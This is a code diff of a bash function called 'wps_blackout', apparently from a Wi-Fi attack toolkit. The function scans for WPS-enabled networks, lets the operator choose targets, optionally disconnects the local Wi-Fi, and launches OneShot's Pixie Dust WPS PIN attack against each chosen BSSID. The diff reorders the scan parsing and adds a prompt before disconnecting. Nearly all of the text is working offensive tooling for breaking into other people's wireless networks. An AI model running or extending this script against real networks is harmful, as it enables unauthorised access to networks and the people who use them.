@@ -146,63 +146,85 @@ wps_blackout(){
 
     printf "\n\e[0m[\e[93m*\e[0m] Scanning for WPS networks (15s)... \n"
 
-    #iq200 sorting wps networks by signal strenght
+    #iq200 sorting wps networks by signal strenght & ssid space removal
     awker="$(pwd)/config/wifi.awk"
-    wps_all=$(iw dev wlan0 scan duration 15 | awk -f $awker | sort)
+    wps_all=$(iw dev wlan0 scan duration 5 | awk -f $awker | sort)
     wps_power=($(printf "$wps_all" | grep "yes" | awk '{print $1}'))
+    wps_ssid=($(printf "$wps_all" | grep "yes" | awk '{print $5 $6}')) 
     wps_bssid=($(printf "$wps_all" | grep "yes" | awk '{print $2}'))
-    wps_ssid=($(printf "$wps_all" | grep "yes" | awk '{print $3}'))
-    wps_channel=($(printf "$wps_all" | grep "yes" | awk '{print $5}'))
+    wps_channel=($(printf "$wps_all" | grep "yes" | awk '{print $4}'))
+
 
     i=0
-    while [ $i -lt ${#wps_ssid[@]} ]
+    while [ $i -lt ${#wps_bssid[@]} ]
     do
-        printf "\n[\e[92m$((i+1))\e[0m] \e[92m${wps_bssid[$i]} \e[93m${wps_ssid[$i]} \e[94mpwr:${wps_power[$i]} \e[96mchnl:${wps_channel[$i]}\e[0m"
+        printf "\n[\e[92m$((i+1))\e[0m] \e[92m${wps_ssid[$i]} \e[93m${wps_bssid[$i]} \e[94mpwr:${wps_power[$i]} \e[96mchnl:${wps_channel[$i]}\e[0m"
         i=$((i+1))
     done
 
-    printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wps_ssid[@]} WPS networks! \n"
+    printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wps_bssid[@]} WPS networks! \n"
 
-    printf "\n[ Select \e[92mone\e[0m, \e[92mmultiple\e[0m comma-separated or (\e[92ma\e[0m)ll target/s: ]\n\n"
+    printf "\n[ Select \e[92mone\e[0m, \e[92mmultiple\e[0m comma-separated or press [\e[92mENTER\e[0m] for all target/s: ]\n\n"
 
     read -p "Choice: " target_number
 
-    if [ $target_number  == "a" ];
+    if [ -z "$target_number" ];
     then
-        target_ssid=("${wps_ssid[@]}")
-        target_bssid=("${wps_bssid[@]}")
+        target_ssid=("${wps_bssid[@]}")
+        target_bssid=("${wps_ssid[@]}")
     else
-        target_ssid=($(echo $target_number | { while read -d, i; do printf "${wps_ssid[$(($i-1))]}\n"; done; printf "${wps_ssid[$(($i-1))]}\n"; }))
-        target_bssid=($(echo $target_number | { while read -d, i; do printf "${wps_bssid[$(($i-1))]}\n"; done; printf "${wps_bssid[$(($i-1))]}\n"; }))
+        target_ssid=($(echo $target_number | { while read -d, i; do printf "${wps_bssid[$(($i-1))]}\n"; done; printf "${wps_bssid[$(($i-1))]}\n"; }))
+        target_bssid=($(echo $target_number | { while read -d, i; do printf "${wps_ssid[$(($i-1))]}\n"; done; printf "${wps_ssid[$(($i-1))]}\n"; }))
     fi
 
-    printf "\n\e[0m[\e[92mi\e[0m] Disconnecting wifi network...\n"
+    printf "\n[ Disconnect wifi before attack? (\e[92my\e[0m/\e[92mn\e[0m): ]\n\n"
+    read -p "Choice: " wifi_disconnect
 
-    LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
-    do nmcli con down uuid $line &>/dev/null;    
-    done
+    if [ -z $wifi_disconnect ];
+    then
+        printf "\n\e[0m[\e[91m!\e[0m] Empty input, not disconnecting! \n"
+        disconnect=0
+    elif [ "$wifi_disconnect" = "y" ] || [ "$wifi_disconnect" = "Y" ];
+    then
+        printf "\n\e[0m[\e[92mi\e[0m] Disconnecting wifi! \n"
+        disconnect=1
+    else
+        printf "\n\e[0m[\e[92mi\e[0m] Not disconnecting wifi! \n"
+        disconnect=0
+    fi
+
+    if [ $disconnect == "1" ];
+    then
+        LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
+        do nmcli con down uuid $line &>/dev/null;    
+        done
+    fi
+
+    # printf "\n\e[0m[\e[92mi\e[0m] Disconnecting wifi network...\n"
+    
 
     printf "\n\e[0m[\e[93m*\e[0m] Attacking network/s using OneShot... \n"
 
     y=0
-    while [ $y -lt ${#target_ssid[@]} ]
+    while [ $y -lt ${#target_bssid[@]} ]
     do  
-        printf "\n\e[0m[\e[93m*\e[0m] ($((y+1))/${#target_ssid[@]}) Attacking ${target_bssid[$y]} (${target_ssid[$y]})\n\n"
+        printf "\n\e[0m[\e[93m*\e[0m] ($((y+1))/${#target_bssid[@]}) Attacking ${target_ssid[$y]} (${target_bssid[$y]})\n\n"
         
-        python3 $(pwd)/config/OneShot/oneshot.py -i wlan0 -b ${target_ssid[$y]} -K -w
+        python3 $(pwd)/config/OneShot/oneshot.py -i $first_iface -b ${target_bssid[$y]} -K -w
         
         printf "\n\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
         read ener_empty_value
         y=$((y+1))
     done 
 
-    sleep 5
-
-    printf "\e[0m[\e[92mi\e[0m] Backing up wifi network connection...\n\n"
-
-    LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
-    do nmcli con up uuid $line &>/dev/null;    
-    done
+    if [ $disconnect == "1" ];
+    then
+        printf "\e[0m[\e[92mi\e[0m] Backing up wifi network connection...\n"
+        LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
+        do nmcli con up uuid $line &>/dev/null;    
+        done
+    fi
+    
 }
 
 check_root
